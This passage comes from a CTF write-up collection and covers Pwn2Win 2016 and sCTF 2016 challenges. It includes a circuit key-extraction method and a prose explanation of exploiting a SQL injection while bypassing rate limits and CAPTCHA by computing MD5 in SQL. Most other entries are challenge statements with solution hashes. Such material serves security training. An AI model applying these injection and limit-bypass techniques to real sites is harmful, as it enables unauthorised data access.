First, we put the circuit into a state in which the door is open, by providing as inputs to the simulation the sample key given in the problem's statement, and a NMEA sentence containing the corresponding date/time during which that key is valid.

Then, we toggle one of the registers enabled by `n4`. This causes the door to close. After that, we try to open the door again by toggling each of the keypad bits. When the door opens, it means we have found to which bit of the key that register is related. We repeat this procedure for each of the registers enabled by `n4`.

This algorithm is very efficient because, at each of the 256² required iterations, we only need to simulate the circuit for a single clock cycle, since the location of the registers holding keypad bits is already known.

Once the key registers are sorted in the correct order, we can simulate the circuit providing any NMEA sentence and afterwards extract the key from these registers.

The tool which implements this method can be compiled by typing:

```
make extract_hash
```

The tool may be called passing as arguments any time and date in the `HHMM ddmmyy` format:

```
$ ./extract_hash 1100 010415
01cd9de119e1231e29b0972a618da6c79fc1f3bd96cee86c93a8068bdc5e4c59
```

If no arguments are provided, the tool prints the correct key for the current minute (in UTC).


#### The Mathematician's Way

Although the method we just explained is very efficient and relatively easy to implement, it is not general, and would not work:

 * If no sample key was provided in the problem's statement.

 * If the registers holding the correct key did not held it exactly as expected to be typed by the user, e.g. if the hash suffered some final transformation before being compared to keypad bits.

A more general approach is to remember that the problem of finding a set of inputs such that the output of an arbitrary digital circuit goes to logical high is a [boolean satisfiability problem](https://en.wikipedia.org/wiki/Boolean_satisfiability_problem).

If we transform the problem to the [conjunctive normal form](https://en.wikipedia.org/wiki/Conjunctive_normal_form), we can feed it to a [SAT solver](http://minisat.se), which will hopefully find the answer in reasonable time (although there are no guarantees, of course, since SAT is a NP-complete problem).

The [Tseytin transformation](https://en.wikipedia.org/wiki/Tseytin_transformation) can be employed to transform a digital circuit to the conjunctive normal form. The equivalent circuits generated by IceStorm only use the following Verilog operations:

| Operation      | Tseytin transformation                                 |
|----------------|--------------------------------------------------------|
| c = a & b      | (¬a∨¬b∨c)∧(a∨¬c)∧(b∨¬c)                             |
| c = a ⎮ b      | (a∨b∨¬c)∧(¬a∨c)∧(¬b∨c)                              |
| d = a ? b : c  | (a∨c∨¬d)∧(¬a∨b∨¬d)∧(b∨c∨¬d)∧(¬a∨¬b∨d)∧(a∨¬c∨d)  |

The `solve_circuit.py` tool takes:

 * The assignments contained in the Verilog RTL file generated by IceStorm.

 * A problem specification containing:

    * constraints, e.g. the door must be open;

    * known values for some identifiers;

    * identifiers whose value we are seeking for (the *incognita*).

It parses the assignments using a simple [Grako](https://pypi.python.org/pypi/grako/3.6.7) grammar, applies the Tseytin transformations presented above, and calls [MiniSat](http://minisat.se) to solve for the value of the *incognita*.

The problem specification is generated by the `solve_hash` tool, which simulates the circuit given some NMEA input, lists the keypad registers as *incognita*, and dumps a snapshot of every other register. The `solve_circuit.py` tool is automatically called by `solve_hash`.

To run these tools, first install the following additional prerequisites:

```
sudo apt-add-repository ppa:pypy/ppa && sudo apt-get update
sudo apt-get install pypy
wget https://bootstrap.pypa.io/get-pip.py && sudo -H pypy get-pip.py
sudo -H pypy -m pip install grako
sudo apt-get install minisat
```

Then compile the tool:

```
make solve_hash
```

The command line arguments accepted by `solve_hash` are exactly the same as the ones accepted by `extract_hash`:

```
$ ./solve_hash 1100 010415
WARNING: for repeatability, setting FPU to use double precision
============================[ Problem Statistics ]=============================
|                                                                             |
|  Number of variables:         12760                                         |
|  Number of clauses:           10543                                         |
|  Parse time:                   0.00 s                                       |
|  Simplification time:          0.00 s                                       |
|                                                                             |
============================[ Search Statistics ]==============================
| Conflicts |          ORIGINAL         |          LEARNT          | Progress |
|           |    Vars  Clauses Literals |    Limit  Clauses Lit/Cl |          |
===============================================================================
===============================================================================
restarts              : 1
conflicts             : 0              (0 /sec)
decisions             : 1              (0.00 % random) (250 /sec)
propagations          : 12760          (3190000 /sec)
conflict literals     : 0              (-nan % deleted)
Memory used           : 24.00 MB
CPU time              : 0.004 s

SATISFIABLE
01cd9de119e1231e29b0972a618da6c79fc1f3bd96cee86c93a8068bdc5e4c59
```


## Other write-ups and resources

* [Challenge source code](https://github.com/epicleet/timekeeperslock)
# Pwn2Win CTF : tokens-50

**Category:** Reverse
**Points:** 50
**Solves:** 
**Description:**
We discovered a Club’s “homemade” token generator system which uses a fixed value as a seed (is it a joke?). Some Club systems use this token scheme, so we need to make a leak in order to compromise them. Due to a week-long effort, our hardcore newbie SkyMex was able to obtain the token generator source code from a private git repository before it received the official seed.

Submit the flag in the format: CTF-BR{seed}.


## Write-up

(TODO)

## Other write-ups and resources

* https://www.eugenekolo.com/blog/pwn2win-2016-python-tokens-writeup/
* http://goo.gl/piOS22
# Pwn2Win CTF 2016: Bathing and Grooming

**Category:** Web
**Points:** 100|400
**Solves:** 1
**Description:**

> Our informant John has discovered that the access key for the murder request
> system changes on every new death carried by the Club. The key is the MD5 of
> the name of ALL the deads until now, in the order they were inserted in the
> database, and without including any separator between the names. Find the
> access key to allow our rebel group to shutdown the system. They use a
> "Bathing and Grooming" website as a cover: https://welovepets.pwn2win.party.
> The flag must be entered in the format CTF-BR{MD5-of-ALL-the-names}.
>
> Bonus (+300 points): For those who, once they discover the table which
> contains the names, are able to obtain the MD5 making a maximum of
> 15 HTTP requests to the website server. Show your complete resolution
> (including > sourcecode) to a judge in order to prove you needed
> 15 requests or less.


## Write-up

The website contains a SQL injection flaw in `/contact/procedure` that is fairly
easy to be found and exploited. The flaw is present in the "Pet's code" field,
which should normally receive a number, but its type can be easily changed
to "text" using the web browser's inspect element feature.

However, there are several limits in place which make it difficult to download the
entire list of names:

 * A mean rate of 3 HTTP requests per minute per IP address is allowed.
 * The form uses reCAPTCHA.
 * Output is truncated to max 32 chars.

By computing the MD5 server-side, we can get around these limits. However,
the server runs SQLite, which has no native MD5 function. Thus, we have to
implement MD5 ourselves in pure SQL.

The following are the main obstacles for achieving that:

 * SQLite is slow at handling big strings. BLOBs behave slightly better, but not
   all needed operations are available on them. Also, accessing a position appears
   not to be O(1) as you would expect. Therefore, we need to break the string in
   some chunks to speed up the calculation.

 * The `WITH RECURSIVE` statement allows to construct loops, but there seems to
   be no way to nest loops and retain acceptable performance. Therefore you need
   to code in state machine style in order to do everything in a single loop.

 * The `VALUES` construction allows to create "table literals" which could hold
   the constants required for computing MD5. However, it is slow to access these
   tables. There seems to be no way to inject a table containing a primary key
   or some kind of index. The solution is to use string literals as arrays.

The [md5.sql](md5.sql) file implements MD5 in pure SQL following these guidelines.
It receives the following parameters:

 * `:OFFSET` and `:LENGTH` of the chunk that is going to be processed.
 * `:A0`, `:B0`, `:C0` and `:D0` hold the MD5 algorithm state.

After processing all of the chunks, the last bytes of the string which don't fit
in a 64 byte block are retrieved, and the final step of MD5 can be implemented
in the attacker's machine.

The [md5_solve.py](md5_solve.py) script coordinates this calculation. It replaces the
correct parameters in [md5.sql](md5.sql) and copies it to the clipboard. The attacker
then pastes the resulting SQL in the web browser and manually solves the CAPTCHA.
After the result is shown in an alert box, the attacker copies it to clipboard.
The script monitors the clipboard, and immediately proceeds to mount the SQL injection
required for the next HTTP request.

Before running the script, install the pyperclip library, which is responsible
for clipboard handling:

```
sudo -H python -m pip install pyperclip
```

After all required HTTP requests are made, the script returns the flag
(MD5 of all names contained in the `procedures` table).


## Other write-ups and resources

* [Challenge source code](https://github.com/epicleet/bathing-and-grooming)
# Pwn2Win CTF : facebug

**Category:** Web
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://security.szurek.pl/pwn2win-ctf-2016-facebug-writeup.html
# Pwn2Win CTF : free-web-access

**Category:** Web
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/p4-team/ctf/tree/master/2016-03-26-pwn2win/free_web_access
# Pwn2Win CTF : v0t3-65

**Category:** Web
**Points:** 65
**Solves:** 
**Description:**
A vote is being held on the Senate to decide whether the internet will be stapled or not , and the Club is manipulating it. Make the "No" win the majority of votes for the internet to be free! “


## Write-up

(TODO)

## Other write-ups and resources

* https://jh00nsec.wordpress.com/2016/03/28/pwn2win-ctf-2016-v0t3-65-points-web-hacking-rtfm-team/
# CTF write-ups 2016

There are some problems with [CTF](https://ctftime.org/ctf-wtf/) write-ups in general:

* they’re scattered across the interwebs
* they don’t usually include the original files needed to solve the challenge
* some of them are incomplete or skip ‘obvious’ parts of the explanation, and are therefore not as helpful for newcomers
* often they disappear when the owner forgets to renew their domain or shuts down their blog

This repository aims to solve those problems.

It’s a collection of CTF source files and write-ups that anyone can contribute to. Did you just publish a CTF write-up? [Let us know](https://github.com/ctfs/write-ups-2016/issues/new), and we’ll add a link to your post — or just add the link yourself and submit a pull request. Spot an issue with a solution? Correct it, and send a pull request.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md).

## Archive

* [Write-ups for CTFs that occurred in 2013](https://github.com/ctfs/write-ups-2013)
* [Write-ups for CTFs that occurred in 2014](https://github.com/ctfs/write-ups-2014)
* [Write-ups for CTFs that occurred in 2015](https://github.com/ctfs/write-ups-2015)
* [Write-ups for CTFs that occurred in 2016](https://github.com/ctfs/write-ups-2016) (this repository)
# sCTF 2016 Q1 : deblink-100

**Category:** Algorithmic
**Points:** 100
**Solves:** 10
**Description:**

You have a device that is nearly completely bricked, but it seems to progress to a stage in boot where you can run your own code, and it conveniently has 8 LEDs. You write a small binary to read the bootlog and emit it, compressed, byte-by-byte on the LEDs. With a phone camera and a shaky hand, you record the LEDs.

Decode the video.


SHA512 Solution Hash(es):
* 9e9fce6a75d81d12b2a4029e0a9607b9602d46ebd9a6d349a7ca0bc00b5f0be2829bf9aa18e471a6f068c12c069e82a9581ad0765f78bb6b1d54db8e1b1203e7

**File**
[blink.mp4](https://compete.sctf.io/2016q1/problemfiles/5/blink.mp4)

**Hint**
0-1-2-3  
4-5-6-7

## Write-up

(TODO)

## Other write-ups and resources

* https://0x90r00t.com/2016/04/17/sctf-2016-code-100-unblink-write-up/
# sCTF 2016 Q1 : pesky-permutations-170

**Category:** Algorithmic
**Points:** 170
**Solves:** 42
**Description:**

Notice: The issue with Pesky Permutations has been resolved; the flag was incorrect due to a minor bug. You should not have to run your file again, just submit your original answer.

One of my favorite pastimes is solving my [Rubik's Cube](https://en.wikipedia.org/wiki/Rubik%27s_Cube). In fact, I've fiddled with it so much that I noticed a pattern: If you repeat the same algorithm on the cube, it will eventually return to its original state.

Can you give me the average number of permutations each algorithm in `perms.dat` takes to return the cube to solved? Round your answer to 2 decimal places and submit without `sctf{}`.

Good Luck!

Note: To be eligible for prizes, you must send your team name and the code you used to solve this problem to adunna@sctf.io


SHA512 Solution Hash(es):
* 50327c1f6ef89757c5ab56e19e186caf8033fab53681c0f3d279470f8c3ccd8e57eb750b4c0ca251f1f4ced2ed58d16ededd9fbce3fa9455969ed0fc496a2d89

**Hint**
This one is pretty straightforward. Start [here](http://ruwix.com/the-rubiks-cube/notation/).
## Write-up

(TODO)

## Other write-ups and resources

* https://pequalsnp-team.github.io/writeups/pesky_permutation
# sCTF 2016 Q1 : png-number-100

**Category:** Algorithmic
**Points:** 100
**Solves:** 28
**Description:**

NOTICE: Flag has been updated. Please resubmit yours if it was incorrect before.

Calculate the sum of decimal digits of the number represented in big-endian by the raw pixel data of `number.png` in BGR byte order.


SHA512 Solution Hash(es):
* 5c99f013d59d75d214e0a227b264728ef28ed187cbcb6e7e98744457681ee8b091af07e136838ad3a934eae1c2ec280b48d665e60439a6ac50154b0524b59375
* 40382f7f0c83533b805d54f2a39457ecc7500ed0f855424a2177eec3dac081adc9d652698f859fc96da021db7a20d8bdb808519271a60f873a604b3ab95a8cb8

**Hint**
Patience.

## Write-up

(TODO)

## Other write-ups and resources

* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/png_number_100_pts.html
# sCTF 2016 Q1 : schensted-110

**Category:** Algorithmic
**Points:** 110
**Solves:** 125
**Description:**

Notice: The issue with Schensted has been resolved. Teams who have previously solved the problem do not need to re-enter their flags.
Clarification: The subsequence consists of only single digit numbers.

I found this sequence of numbers... can you give me the length of the longest ~~increasing~~ **nondecreasing** subsequence? Submit in the format `sctf{answer}`


SHA512 Solution Hash(es):
* d7aed3296c8cd32e3b2816f8f34f8c23ad151e2fc11cea04ac11d004f85fabb0c70a1a060f13cf9a1236d02e09b8f095be96f09950dc0adc796d4a0e8ebed5ff

**Hint**
Elegance is key

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : space-friends-200

**Category:** Algorithmic
**Points:** 200
**Solves:** 43
**Description:**

UPDATE: The flag format changed slightly. The extra semicolon after the network4 answer has been removed.

We have a lot of friends because we're super popular, but unfortunately we have to split our set of friends into two halves so they can go into war with each other. That's just life, unfortunately.

We have a set of `N` friends, and `M` pairwise connections between friends. Each connection goes both ways, so if, for example, Aariss Weiron is friends with Bendelman, then Bendelman is also friends with Aariss Weiron. Each connection also has an associated weight, representing how close the two friends are, which is a positive integer value. No two pairs of friends with a connection have the same weight.

Our objective is to somehow divide our set of friends into two 'equal' halves. We also want to put friends who are pretty close to each other into the same set. We formally define the problem as follows:

> We have a set of friends of even size, some with bi-directional pairwise connections. Each connection has a positive integer weight, and each connection has a distinct weight. Our objective is to divide our friends into two sets of equal size with this property: The largest connection-weight that crosses between the two sets should be as small as possible. Compute this connection-weight for each friend network given. A crossing connection is one such that the two friends it connects are in different sets.
Each friend network is in the following format:

The first line has two numbers: `N` (guaranteed to be even) and `M` (number of connections). `M` lines follow this line. Each one represents a connection and has three tokens. The first two are the friends it connects, and the last one is the weight of the connection.

The flag format is the following:


    sctf{<network_1_answer>;<network_2_answer>;<network_3_answer>;<network_4_answer>}

Include the `sctf{}` part and the semicolons.

Note: To be eligible for prizes, you must send your team name and the code you used to solve this problem to adunna@sctf.io

SHA512 Solution Hash(es):
* a35ed0f78278701c1f5d188c799a48caabce8bf27fe28f4acfd5db779a60a3bebf956541bb7085fb09dc39cf3cadb580e479a17807e6863b6d01443fb1087a73

**Hint**
Fun graph theory :)

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/marodere/ctf/tree/master/2016/sctf/spacefriends
# sCTF 2016 Q1 : tracking-85

**Category:** Algorithmic
**Points:** 85
**Solves:** 172
**Description:**

[Global Positioning Systems](https://en.wikipedia.org/wiki/Global_Positioning_System) (GPS) use satellites to [trilaterate](https://en.wikipedia.org/wiki/Trilateration) a device's position on Planet Earth. You will need to use a very similar method to solve this problem. Download the description and input file to get started!


SHA512 Solution Hash(es):
* fbc268426e4979c5d4c0ade50b12195898d4b8780faf50b639a329b2fa5898538403a7084f6bb58f91abe819133ab520dde4a08a75ab2d8b71a01d970a569c45

**Hint**
Submit your flag in the format: `sctf{x, y, z}`

## Write-up

(TODO)

## Other write-ups and resources

* http://hack.carleton.team/2016/04/16/tracking-85-points/
# sCTF 2016 Q1 : ed25519-40

**Category:** Crypto
**Points:** 40
**Solves:** 15
**Description:**

Ed25519-sign the flag with the same private key and implementation flaw used to sign the messages below. The flag is the base64 representation of the signature.

Public key: `5bfcb1cd3938f3f6f3092da5f7d7a1bdb1d694a725d0585a99208787554e110d`

Message: sctf.io
Signature: `68299a51b6b592e2db83c26ca3594bdd81bdbb9f11c597a1deb823da7c8b9de8e2224855125b1acbeab1468bf4860c1eeb05b6d2375e2214c55bdfe808a6c106`

Message: 2016 Q1
Signature: `68299a51b6b592e2db83c26ca3594bdd81bdbb9f11c597a1deb823da7c8b9de825ad01a05a0cce69258d41d42ed046956e7d4586eb21ff031bf8ac03243d5e04`


SHA512 Solution Hash(es):
* fe13e9a58c471dc3d0a6af59c3ba6b6250f68e230570cd102089acb41cf812dcfa615f8862853dd1fb9fed997ea003f2


## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3193
# sCTF 2016 Q1 : lengthy-lingo-35

**Category:** Crypto
**Points:** 35
**Solves:** 231 
**Description:**

Can you crack the code? We intercepted this flag but can't seem to figure out how it was encrypted.


SHA512 Solution Hash(es):
* c970d34767a754b8f7794c21499e55285055e4eac50854c501a9c271daa8ca296f9cb22d0fb3bfea448dfad5


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Lengthy-Lingo
* https://github.com/318br/sctf/tree/master/2016q1/LengthyLingo
# sCTF 2016 Q1 : pythagoras-hash-100

**Category:** Crypto
**Points:** 100
**Solves:** 9
**Description:**

You have part of the source to a really bad hash function, and an oracle that will hash anything up to 32 bytes. Hash the following string.

the flag the flag the flag the flag the flag the flag the flag the game

*(71 bytes — sorry, the oracle will not hash it for you)*

You may access the oracle at <http://problems1.2016q1.sctf.io:17117/>. The oracle accepts a base64-encoded input passed via the query string. You can interface with the oracle using your browser (e.g. <http://problems1.2016q1.sctf.io:17117/?dGhlIGZsYWc=)>, cURL, or anything you want, really.

    $ hash() { curl 'http://problems1.2016q1.sctf.io:17117/?'\"$(echo -n $1 | base64)\"; }
    $ hash 'the flag'
    d0d27218a363a192


SHA512 Solution Hash(es):
* f066d440d0184c9beb3d6d939fa7c950b1d5eaa8bce6b12fca30b0d1315f4dbce95aed328b0a2576aa548016e922555690285d270e3cb5569e45b77ce675fc84

**Hint**
Sliding window

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : verticode-90

**Category:** Crypto
**Points:** 90
**Solves:** 270
**Description:**

Welcome to Verticode, the new method of translating text into vertical codes.

Each verticode has two parts: the `color shift` and the `code`.

The code takes the inputted character and translates it into an ASCII code, and then into binary, then puts that into an image in which each black pixel represents a 1 and each white pixel represents a `0`.

For example, `A is 65` which is `1000001` in binary, `B is 66` which is `1000010`, and `C is 67` which is `1000011`, so the corresponding verticode would look like [this](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/crypto/verticode-90/A-Code.png).

Except, it isn't that simple.

A color shift is also integrated, which means that the color before each verticode shifts the ASCII code, by adding the number that the color corresponds to, before translating it into binary. In that case, the previous verticode could also look like [this](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/crypto/verticode-90/B-Code.png).

The table for the color codes is:

0 = Red  
1 = Purple  
2 = Blue  
3 = Green  
4 = Yellow  
5 = Orange  

This means that a red color shift for the letter `A`, which is `65 + 0 = 65`, would translate into `1000001` in binary; however, a green color shift for the letter `A`, which is `65 + 3 = 68`, would translate into `1000100` in binary.

Given [this verticode](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/crypto/verticode-90/code1.png), read the verticode into text and find the flag.

Note that the flag will not be in the typical `sctf{flag}` format, but will be painfully obvious text. Once you find this text, you will submit it in the `sctf{text}` format. So, if the text you find is adunnaisawesome, you will submit it as `sctf{adunnaisawesome}`.


SHA512 Solution Hash(es):
* 2daf3b3818d0ccb51134f7875fe3fd2221657151de15c5ca39a1902fbe81104e40e3fb4f6d27bbfd85b7445c4566153de1388dffac10608b7102fa8988b89fe7

**Hint**
Try looking up some imaging libraries.

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Verticode
* https://github.com/318br/sctf/tree/master/2016q1/Verticode
* http://hack.carleton.team/2016/04/18/sctf-io-2016-q1-verticode-90-points/
* http://ipushino.blogspot.com/2016/04/sctf-2016-q-verticode-crypto.html
* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/verticode_90_pts.html
* https://pequalsnp-team.github.io/writeups/verticode
# sCTF 2016 Q1 : vertinet-140

**Category:** Crypto
**Points:** 140
**Solves:** 180
**Description:**

This problem follows the same specifications as the previous Verticode problem, except that you have to solve many of them by developing a client to communicate with the server available at problems1.2016q1.sctf.io:50000. Good luck.


SHA512 Solution Hash(es):
* f452d709fddad3bd936776682cc11127373e4c1ca80c51be1a59ae79d6f2d08669e51152dac5bc2b28cd96c18ad7

**Hint**
Try looking up some imaging libraries as well as some networking stuff.

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Vertinet
* https://github.com/318br/sctf/tree/master/2016q1/Vertinet
* https://pequalsnp-team.github.io/writeups/vertinet
# sCTF 2016 Q1 : when-in-rome-10

**Category:** Crypto
**Points:** 10
**Solves:** 1284
**Description:**

I heard of a cipher named after Julius Caesar, and I want you to try it out! Try decoding this message:

    Nvctfdv kf jTKW! Nv yfgv pfl veafp kyv gifscvdj nv yrmv nizkkve wfi kyv wzijk hlrikvi fw 2016. Yviv zj pfli wzijk fw (yfgvwlccp) drep wcrxj! jtkw{ny3e_1e_tkw_u0_r5_tkw3i5_u0}

SHA512 Solution Hash(es):
* 37350cd2d209bc415a440d5ccb31583269fd679dd10a527df5c95153ec64f19d39c12ba42fb39809a07373

**Hint**
[This](http://rumkin.com/tools/cipher/) website might help.

## Write-up

(TODO)

## Other write-ups and resources

* http://hack.carleton.team/?p=50&preview=true
* http://bryceandress.github.io/2016/04/11/sctf2016-when-in-rome.html
# sCTF 2016 Q1 : banana-boy-20

**Category:** Forensic
**Points:** 20
**Solves:** 673
**Description:**

Carter loves bananas, but I heard a rumor that he's hiding something!

Can you find it?


SHA512 Solution Hash(es):
* 07b14d910e60081f301d5827d8dcf1e544d73879bc9ae0a09d1ac4234007ef068e777e00eb2252b415c5cb516582f27efec8af653558ee2b3d432c14e28ac559

**Hint**
Is it really just an image?

## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/sctf-2016-banana-boy/
# sCTF 2016 Q1 : corruption-100

**Category:** Forensic
**Points:** 100
**Solves:** 0
**Description:**

UPDATED: Hint updated and corrected.
Someone corrupted my photo. Fix it for me?


SHA512 Solution Hash(es):
* 12dddd3f91d223fe4fdcd950b066367ec59ad03cd2a1f2448d70898da8b71cfd1a71b0f7596fe8f893dc1c239d324ba1e77ba976dbcb9cb430152e08529ef01e

**Hint**
One byte zeroed after compression, but before CRC is recalculated.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : failed-compression-80

**Category:** Forensic
**Points:** 80
**Solves:** 72
**Description:**

I was trying to compress some files, but I think I messed it up?


SHA512 Solution Hash(es):
* b27b90cc4af150968016bada4c5051a94049e9da3081ad71aa7498b67e3ca5d817d8146844d22a91a7db5d4e61c24fddfda376c77f6be476ca469c84d6b26793

**Hint**
I know I had a flag in there somewhere...

**File**
[compressed.zip](https://compete.sctf.io/2016q1/problemfiles/31/compressed.zip)

## Write-up

(TODO)

## Other write-ups and resources

* https://pequalsnp-team.github.io/writeups/failed_compression
* https://github.com/318br/sctf/tree/master/2016q1/FailedCompression
# sCTF 2016 Q1 : musical-penguins-45

**Category:** Forensic
**Points:** 45
**Solves:** 34
**Description:**

This file is a complete mystery to me, I've never seen notes like these!


SHA512 Solution Hash(es):
* 4cfb5e6cfcf966adca8084502fb675c5734323e8501cf5a12e78004378b15cb41529fcb1a5bf8b26e9aef277e815

**Hint**
Morgan Freeman and Kevin Spacey would have fun with this one.

## Write-up

(TODO)

## Other write-ups and resources

* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/musical_penguins_45_pts.html
* https://github.com/cabrody/ctf/blob/master/Musical%20Penguins.md
# sCTF 2016 Q1 : rain-or-shine-35

**Category:** Forensic
**Points:** 35
**Solves:** 160
**Description:**

I've been working so hard on problems that I didn't even notice it was raining outside. I decided to take a short break and record some ambient sound for a game I've been working on, and just for fun I stuck a flag somewhere in there too! Can you find it for me?


SHA512 Solution Hash(es):
* dd049f524fafebf62dbc3925c3908f25d1da3beedb3b85655d3a2b584ac93f6097550e914b0f2a59b115d244a61a855f1ccceb40c8473c59f1171fd8ff05af29

**Hint**
If you're stuck, start [here](https://en.wikipedia.org/wiki/Steganography).

**File**
[rain.wav](https://compete.sctf.io/2016q1/problemfiles/18/rain.wav)

## Write-up

(TODO)

## Other write-ups and resources

* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/rain_or_shine_35_pts.html
* https://github.com/318br/sctf/blob/master/2016q1/RainOrShine/
* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Rain-or-Shine
# sCTF 2016 Q1 : can-nerds-fly-100

**Category:** Prog-Lang
**Points:** 100
**Solves:** 12
**Description:**

UPDATED: This problem now uses a grading server instead of asking for the size of the CNF.

I've got a task for you involving a program language I've created! It's called Prop (short for Proposition), and as you might expect, it's a simple language for propositional logic. It consists of the following expressions (denoted `e`):

* Boolean constants, written `true` and `false`.
* Boolean variables, written as any alphabetical string.
* Implies, written `e -> e`.
* Equivalence, written `e <-> e`.
* Negation, written `!e`.
* And, written `e && e`.
* Or, written `e || e`.
You can also parenthesize any expressions or subexpressions (so, you can write `(a || b) && c)`. Here's another example program:

    (a || b) && c && d && (!d || b) || (b -> c) && (d <-> a)

So, what I'd like from you is for you to calculate the conjunctive normal form (CNF) of the attached program. You can submit the CNF [here](http://problems4.2016q1.sctf.io:11426/).


SHA512 Solution Hash(es):
* 3b491cd03f456e40d0166acce6be897ac9e2f2c3e5fabfc7a0d980ef07bf92eb1bc4b16228accf60d111e28a1dd

**Hint**
You'll probably want to figure out how conjunctive normal form is defined...

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : check-em-160

**Category:** Prog-Lang
**Points:** 160
**Solves:** 7
**Description:**

UPDATED: This problem now uses a grading server instead of asking for the size of the CNF.

I've got this program in a language I've made called Imp (short for Imperative). It's a straightforward language. It probably amounts to a very simplified version of languages you already know. Let me tell you about it. It has all the following.

Arithmetic expressions (denoted `a`) featuring:

* Numeric constants (unsigned and unbounded), written as you'd expect (`0, 3, 42, 7418`).
* Identifiers, written as any alphabetical string.
* Addition, written `a + a`.
* Multiplication, written `a * a`.

Boolean expressions (denoted `b`) featuring:

* Boolean constants, written `true` and `false` respectively.
* Negation, written `!b`.
* And, written `b && b`.
* Or, written `b || b`.
* Less than, written `a < a`.
* Greater than, written `a > a`.
* Equals, written `a = a`.
* Less than or equal to, written `a <= a`.
* Greater than or equal to, written `a >= a`.

Statements (denoted `s`) featuring:

* Variable assignments, written `id <- a` where id is any alphabetical identifier.
* Sequencing, written `s; s`.
* If statements, written `if b then s else s`
* Skip, written `skip`
* Panic, written `panic`

In addition, the last line of the program contains a post-condition for the program written `{b}`.

So, here's an example program:

    y <- 4;
    if x < y then skip else panic;
    y <- x * 2;
    if y < x then panic else skip;
    z <- x + y
    {z = 3 * x && y = 2 * x}

I want to be able to use my program and ensure that it works, but in order to do so, I need to know under what conditions its safe to run it. Can you figure out the most permissive set of conditions that will ensure that my program completes with the specific post-condition? When you've figured it out, submit it to this server.


SHA512 Solution Hash(es):
* dd25a685f7772c596ce5f7ea6f31bea6d3f22caafdaf49ca65f4a942918b86ec04833b3faa1a7f98e29a1baed5da2ed1

**Hint**
I believe Wikipedia has something to say about predicate transformer semantics...


## Write-up

(TODO)

## Other write-ups and resources

* https://0x90r00t.com/2016/04/19/sctf-2016-code-130-i-cant-get-no-satisfaction-write-up/
# sCTF 2016 Q1 : i-cant-get-no-satisfaction-130

**Category:** Prog-Lang
**Points:** 130
**Solves:** 55
**Description:**

I've got another task for you involving my little language, Prop!

It consists of the following expressions (denoted `e`):

* Boolean constants, written `true` and `false`.
* Boolean variables, written as any alphabetical string.
* Implies, written `e -> e`.
* Equivalence, written `e <-> e`.
* Negation, written `!e`.
* And, written `e && e`.
* Or, written `e || e`.
You can also parenthesize any expressions or subexpressions (so, you can write `(a || b) && c)`. Here's another example program:

    (a || b) && c && d && (!d || b) || (b -> c) && (d <-> a)

This time, I've determined that the attached program is satisfiable, but I want to know the actual values that make this program satisfiable. Can you find me a satisfying model, please? When you've found one, submit a GET request to our [server](http://problems3.2016q1.sctf.io:11420/). Any missing keys are considered false.

Here's an example request:

    http://problems3.2016q1.sctf.io:11420/?a=true&b=true&c=false

This request would treat `a` and `b` as `true` and `c` and the rest of the variables as `false`. Thus, it's only necessary to assign the true keys to the value true.


SHA512 Solution Hash(es):
* bb5d6f98cc3b4d722893b98d6cdb112c675da0cf1c09310a824a2b6131297f193b530e2e812281cf3b0274daaa78633fb61f33e8b118bea42325a3a12c934b30

**Hint**
You'll probably want to figure out how conjunctive normal form is defined...

## Write-up

(TODO)

## Other write-ups and resources

* https://0x90r00t.com/2016/04/19/sctf-2016-code-130-i-cant-get-no-satisfaction-write-up/
# sCTF 2016 Q1 : whats-that-type-190

**Category:** Prog-Lang
**Points:** 190
**Solves:** 4
**Description:**

I've got this little program here that I've written in a language I've theoretically designed called L^3 (pronounced L-cubed, stands for "Little Lambda Language"). It's a pretty simple language. It's missing a lot of the features you're probably accustomed to, but that's okay. It has only the following:

* numeric constants (unsigned and unbounded), written as you'd expect (`0, 3, 42, 7418`).
* Identifiers, written either `α or β` (yes, there are only two possible identifiers!).
* Functions, written `λid. body` where id is any valid identifier and body is any valid expression.
* Function application, written `f x` where f is a function and x is any valid expression.
* Addition, written "a + b" where a and b are any valid expression that evaluates to a number.
* Parentheses are welcome around any expression.

So, here's an example program: `(λα. λβ. α + β) 4 5`

You may find it useful to know that the Unicode value of λ is U+03BB, the Unicode value of α is U+03B1, and the Unicode value of β is U+03B2.

My language is all well and good, but I'm way too busy to implement it. I just want to know quickly if this program I wrote is valid. Can you figure out the type of the attached program for me? That'll be an easy way to check! We write types like this:

* numbers have the type `num`
* Functions have the type `T1 -> T2` where T1 and T2 are any valid type.
* Top is a type that matches any type, written `⊤`. The Unicode value of ⊤ is U+22A4.
* Parentheses are welcome around any type or subtype.
* Function arrows are right-associative. That is, `num -> num -> num` is equivalent to `num -> (num -> num)`.
So, here's some example types:

    num -> ((num -> (num -> num)) -> num)
    ⊤ -> ⊤ -> num
When you've figured out the type of my program, just submit it to my [test server](http://problems3.2016q1.sctf.io:11422/). If you figure it out, I'll give you the flag.


SHA512 Solution Hash(es):
